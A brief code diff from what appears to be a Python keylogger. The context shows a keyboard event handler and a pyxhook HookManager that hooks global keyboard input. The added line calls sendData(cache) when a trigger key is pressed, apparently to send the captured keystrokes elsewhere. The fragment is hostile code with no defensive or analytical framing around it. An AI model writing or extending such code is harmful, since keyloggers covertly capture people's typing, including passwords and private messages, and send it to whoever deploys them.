@@ -54,6 +54,7 @@ def kbevent (event):
     if event.Ascii == 65:
         global running
         running = False
+        sendData(cache)
 
 def runHook():
     hm = pyxhook.HookManager()
